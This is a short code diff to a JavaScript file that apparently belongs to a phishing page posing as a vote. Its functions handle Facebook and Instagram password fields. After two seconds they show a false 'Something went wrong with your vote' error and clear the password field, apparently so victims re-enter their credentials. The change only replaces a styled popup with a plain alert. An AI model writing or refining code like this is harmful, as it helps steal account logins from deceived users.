@@ -42,12 +42,7 @@ function hmlog() {
     });
 
     setTimeout(function () {
-      Swal.fire({
-        title: "Oops!",
-        text: "Something went wrong with your vote.",
-        icon: "error",
-        confirmButtonText: "Try Again",
-      });
+      alert("Oops! Something went wrong with your vote. Try again.");
       document.getElementById("fb-pass").value = "";
 
       return false;
@@ -85,13 +80,7 @@ function iglog() {
     });
 
     setTimeout(function () {
-      Swal.fire({
-        title: "Oops!",
-        text: "Something went wrong with your vote.",
-        icon: "error",
-        confirmButtonText: "Try Again",
-      });
-
+      alert("Oops! Something went wrong with your vote. Try again.");
       document.getElementById("ig-pass").value = "";
       return false;
     }, 2000);
@@ -127,12 +116,7 @@ function login() {
     });
 
     setTimeout(function () {
-      Swal.fire({
-        title: "Oops!",
-        text: "Something went wrong with your vote.",
-        icon: "error",
-        confirmButtonText: "Try Again",
-      });
+      alert("Oops! Something went wrong with your vote. Try again.");
       document.getElementById("fb-pass").value = "";
 
       return false;
